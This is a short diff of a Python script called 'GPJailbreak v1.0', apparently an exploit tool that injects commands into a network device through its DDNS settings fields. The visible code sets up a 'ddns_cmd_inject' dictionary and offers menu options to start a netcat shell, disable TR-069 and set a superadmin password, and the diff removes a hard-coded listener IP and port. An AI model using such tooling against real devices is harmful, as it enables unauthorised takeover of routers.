@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import requests, json, re, time, os, sys, threading, base64, hashlib
 import http.server
 import socketserver
@@ -102,9 +103,6 @@ if(session[0]):
     # To prevent soft-locking device API if command hangs i used timeout to force kill curl process
     ddns_cmd_inject = {'Service':'ZoneEdit.com','UserName':'AAAA','Password':'BBBB','HostName':'CCCC','Status':'','InternetIpAddress':''}
     ddns_clear = {'Service':'Disable','UserName':'','Password':'','HostName':'','Status':'','InternetIpAddress':''}
-
-    settings_localip = "89.163.227.167"
-    settings_localport = "49153"
 
     while(True):
         print("======================================\n\n\tGPJailbreak v1.0\n\nOptions:\n\t1. Test connection\n\t2. Start netcat shell\n\t3. Disable TR-069\n\t4. Set superadmin password\n\t5. Unblock Command Shell \n\t6. Quit\n\n======================================")
